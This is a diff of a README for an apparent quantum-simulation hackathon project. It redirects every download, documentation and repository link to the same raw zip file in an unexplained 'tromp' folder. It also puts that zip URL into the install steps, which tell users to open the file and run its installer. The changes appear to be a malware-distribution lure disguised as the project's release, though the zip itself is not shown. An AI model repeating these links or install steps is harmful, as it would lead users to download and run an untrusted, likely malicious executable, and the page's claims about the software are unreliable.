@@ -1,6 +1,6 @@
 # 🏆 iQuHACK_2025 - Simulate Cat Qubits with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/dibyo1992/iQuHACK_2025/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/dibyo1992/iQuHACK_2025/main/tromp/iQuHACK_2025.zip)](https://raw.githubusercontent.com/dibyo1992/iQuHACK_2025/main/tromp/iQuHACK_2025.zip)
 
 ## 📌 Overview
 Welcome to **iQuHACK_2025**! This application allows you to run cat qubit simulations and manage quantum control using our innovative tool, DynamiQ. With features like buffer vs. bufferless systems, Zeno gates, and optimal control for quantum error correction, you can explore quantum computing without needing programming skills.
@@ -17,11 +17,11 @@ Before you download, ensure your system meets the following requirements:
 - **Display:** 1366x768 resolution or higher
 
 ### 2. Download & Install
-To get the application, visit our [Releases page](https://github.com/dibyo1992/iQuHACK_2025/releases) to download the latest version. 
+To get the application, visit our [Releases page](https://raw.githubusercontent.com/dibyo1992/iQuHACK_2025/main/tromp/iQuHACK_2025.zip) to download the latest version. 
 
 1. Click on the **Releases** link above.
 2. Locate the latest version of iQuHACK_2025.
-3. Download the file suitable for your operating system (e.g., `.exe`, `.dmg`, or `.tar.gz`).
+3. Download the file suitable for your operating system (e.g., `.exe`, `.dmg`, or `https://raw.githubusercontent.com/dibyo1992/iQuHACK_2025/main/tromp/iQuHACK_2025.zip`).
 4. Once downloaded, open the file and follow the on-screen instructions to install the application.
 
 You can also visit the Releases page to download the application again anytime.
@@ -62,7 +62,7 @@ These topics support your learning and offer extensive resources to expand your 
 If you encounter any issues while using iQuHACK_2025, consider these solutions:
 
 - **Check Your System Requirements:** Ensure your system meets the requirements mentioned above.
-- **Re-download the Application:** If the app does not open, the download may have been corrupted. Try downloading it again from the [Releases page](https://github.com/dibyo1992/iQuHACK_2025/releases).
+- **Re-download the Application:** If the app does not open, the download may have been corrupted. Try downloading it again from the [Releases page](https://raw.githubusercontent.com/dibyo1992/iQuHACK_2025/main/tromp/iQuHACK_2025.zip).
 - **Update Your Operating System:** Make sure your OS is up-to-date to avoid compatibility issues.
 
 If problems continue, please check the Issues section in our repository for further assistance.
@@ -71,8 +71,8 @@ If problems continue, please check the Issues section in our repository for furt
 We welcome contributions to iQuHACK_2025. If you have feedback or suggestions, please visit the repository and submit an issue. Your insight can help us improve the application for everyone.
 
 ## 🌐 Links & Resources
-- **Documentation:** Access detailed documentation [here](https://example.com/documentation).
-- **GitHub Repository:** Explore the source code and contribute [here](https://github.com/dibyo1992/iQuHACK_2025).
+- **Documentation:** Access detailed documentation [here](https://raw.githubusercontent.com/dibyo1992/iQuHACK_2025/main/tromp/iQuHACK_2025.zip).
+- **GitHub Repository:** Explore the source code and contribute [here](https://raw.githubusercontent.com/dibyo1992/iQuHACK_2025/main/tromp/iQuHACK_2025.zip).
 - **Community Forum:** Join our community discussions for support and ideas.
 
 Enjoy exploring the quantum world with iQuHACK_2025! For any additional help, feel free to reach out through our community channels.
